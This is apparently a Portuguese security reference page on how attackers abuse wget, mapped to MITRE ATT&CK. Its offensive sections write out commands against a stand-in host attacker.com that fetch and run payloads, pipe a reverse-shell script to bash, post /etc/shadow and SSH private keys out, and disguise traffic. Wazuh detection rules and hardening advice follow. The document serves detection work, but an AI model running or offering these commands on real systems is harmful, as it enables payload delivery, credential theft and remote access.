# wget

**Plataforma:** Linux / macOS

**Categorias:** Download, Exfiltração, Shell reverso

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1048.003 (Exfiltration Over Alternative Protocol), T1071.001 (Web Protocols)

**Referência ofensiva:** https://gtfobins.org/gtfobins/wget/

---

## O que é o wget

O wget é uma ferramenta de linha de comando para download de arquivos via HTTP, HTTPS e FTP. Seu nome vem de "World Wide Web get". Está instalado por padrão na maioria das distribuições Linux e é amplamente usado por administradores e desenvolvedores para automação de downloads, mirroring de sites e recuperação de arquivos em scripts.

Diferente do curl, o wget foi projetado especificamente para download recursivo de conteúdo web, o que inclui capacidades como seguir links, baixar sites completos e retomar transferências interrompidas. Essa versatilidade, combinada com a presença garantida na maioria dos ambientes Linux, o torna frequentemente usado por atacantes.

---

## Por que atacantes usam o wget

O wget resolve o mesmo problema fundamental do curl — trazer ferramentas para dentro do ambiente — mas com algumas características próprias que o tornam preferível em certas situações. A flag `--post-data` permite enviar dados em requisições POST, abrindo possibilidades de exfiltração. O modo spider e o download recursivo permitem mapear e copiar servidores internos. E assim como o curl, o binário é legítimo, assinado pelo pacote da distribuição e raramente bloqueado.

---

## Técnicas de abuso

### Download de payloads e ferramentas

```bash
# Download básico de arquivo
wget http://attacker.com/payload.sh

# Download com nome diferente para dificultar identificação
wget http://attacker.com/update.bin -O /tmp/.cache_update

# Download silencioso sem output no terminal
wget -q http://attacker.com/payload.sh -O /tmp/p.sh

# Download e execução imediata
wget -q http://attacker.com/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh

# Download via HTTPS ignorando erro de certificado
wget --no-check-certificate -q https://attacker.com/payload.sh -O /tmp/p.sh

# Baixar para diretório de escrita universal
wget -q http://attacker.com/implant -O /dev/shm/.update
```

O uso de `/dev/shm` é especialmente interessante do ponto de vista ofensivo: trata-se de um sistema de arquivos em memória presente em Linux moderno, e ferramentas de monitoramento que focam apenas em disco podem não alertar para arquivos criados ali.

### Exfiltração de dados via POST

O wget suporta envio de dados via POST, o que permite exfiltrar conteúdo diretamente para um servidor controlado pelo atacante simulando submissão de formulário.

```bash
# Exfiltrar arquivo via POST
wget --post-file=/etc/passwd http://attacker.com/collect -O /dev/null

# Exfiltrar conteúdo de variável via POST
wget --post-data="data=$(cat /etc/shadow | base64)" http://attacker.com/collect -O /dev/null

# Exfiltrar múltiplos arquivos em loop
for f in /root/.ssh/id_rsa /home/*/.ssh/id_rsa; do
  wget --post-file="$f" "http://attacker.com/collect?name=$(basename $f)" -O /dev/null 2>/dev/null
done
```

### Download recursivo de serviços internos

Em ambientes onde o wget é executado em um servidor com acesso à rede interna, o modo recursivo pode ser usado para mapear e copiar serviços web internos.

```bash
# Copiar site interno inteiro (útil em SSRF ou pós-exploração)
wget -r -np -q http://192.168.1.100/ -P /tmp/dump/

# Mirror de painel administrativo interno
wget -r -np -q --mirror http://intranet.empresa.local/admin/ -P /tmp/loot/
```

### Shell reverso via wget

O wget por si só não estabelece shell reverso, mas serve como stager para baixar e executar scripts que o fazem.

```bash
# Baixar e executar script de shell reverso em uma linha
wget -qO- http://attacker.com/revshell.sh | bash

# A flag -O- redireciona a saída para stdout em vez de arquivo, alimentando o pipe diretamente
# Isso evita tocar o disco
```

---

## Técnicas de bypass e evasão

### Substituição de User-Agent

O wget tem um User-Agent padrão identificável (`Wget/X.X.X`). Substituí-lo é trivial.

```bash
# Simular navegador
wget --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
  http://attacker.com/payload -O /tmp/p

# Simular ferramenta de monitoramento corporativa
wget --user-agent="Zabbix/6.0" http://attacker.com/payload -O /tmp/p
```

### Bypass de validação de certificado SSL

```bash
# Ignorar erros de certificado (C2 com cert autoassinado)
wget --no-check-certificate https://attacker.com/payload -O /tmp/p

# Especificar CA bundle próprio
wget --ca-certificate=/tmp/.ca.pem https://c2.attacker.com/cmd -O /tmp/out
```

### Uso de protocolos e recursos alternativos

```bash
# Download via FTP
wget ftp://attacker.com/payload.sh -O /tmp/p.sh

# Usando variáveis para ofuscar a URL
base="http://attac"
rest="ker.com/pay"
end="load.sh"
wget -qO- "${base}${rest}${end}" | bash
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- wget com pipe para bash ou outro interpretador (`wget -qO- ... | bash`)
- wget executado por processo filho de servidor web (apache2, nginx, php-fpm)
- wget com `--post-file` ou `--post-data` contendo caminhos de arquivos sensíveis
- wget escrevendo em `/dev/shm`, `/proc/self/fd` ou diretórios ocultos
- wget com `--no-check-certificate` contra destinos externos

**Indicadores de média relevância:**

- wget em modo recursivo (`-r`) contra IPs internos (potencial dump de serviço interno)
- wget executado por usuários de sistema (www-data, nobody)
- wget com User-Agent diferente do padrão da ferramenta

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0100-gtfobins_network.xml -->

<!-- wget executado por conta de serviço web -->
<rule id="100205" level="14">
  <if_group>auditd</if_group>
  <field name="audit.command">wget</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>wget executado por conta de servico web — possivel RCE ou webshell ativa</description>
  <mitre>
    <id>T1105</id>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- wget com pipe para interpretador -->
<rule id="100206" level="12">
  <if_group>auditd</if_group>
  <field name="audit.command">wget</field>
  <field name="audit.execve" type="pcre2">bash|/sh|python|perl|ruby|php</field>
  <description>wget com pipe para interpretador — possivel execucao de payload em memoria</description>
  <mitre>
    <id>T1105</id>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- wget enviando dados via POST (exfiltração) -->
<rule id="100207" level="11">
  <if_group>auditd</if_group>
  <field name="audit.command">wget</field>
  <field name="audit.execve" type="pcre2">--post-file|--post-data</field>
  <description>wget com POST de dados para servidor externo — possivel exfiltracao</description>
  <mitre>
    <id>T1048.003</id>
  </mitre>
</rule>

<!-- wget com SSL desabilitado -->
<rule id="100208" level="9">
  <if_group>auditd</if_group>
  <field name="audit.command">wget</field>
  <field name="audit.execve" type="pcre2">--no-check-certificate</field>
  <description>wget com validacao SSL desabilitada — comum em comunicacao com C2 autoassinado</description>
  <mitre>
    <id>T1071.001</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Scripts de instalação e provisionamento** — cloud-init e scripts de bootstrap frequentemente usam `wget | bash` para instalar dependências. Filtre pela janela de tempo do boot e pelo usuário root em contexto de provisionamento.

**Ferramentas de monitoramento** — Nagios e similares usam wget para checar disponibilidade de serviços. Filtre por usuário do agente de monitoramento e destinos internos conhecidos.

**Desenvolvedores** — uso manual do wget por usuários com shell interativo é esperado. Concentre alertas em execuções com parent process suspeito (servidor web, cron, etc.).

---

## Proteção e controles defensivos

Os mesmos controles aplicados ao curl se aplicam ao wget: restrição por AppArmor/SELinux, regras de egress no firewall por UID, e inspeção SSL em proxy corporativo. Adicionalmente, o uso de `/dev/shm` como destino de download deve ser monitorado via FIM (File Integrity Monitoring) do Wazuh, configurado para alertar sobre qualquer arquivo criado nesse caminho.

---

## Referências

- GTFOBins — wget: https://gtfobins.org/gtfobins/wget/
- MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1048: https://attack.mitre.org/techniques/T1048/
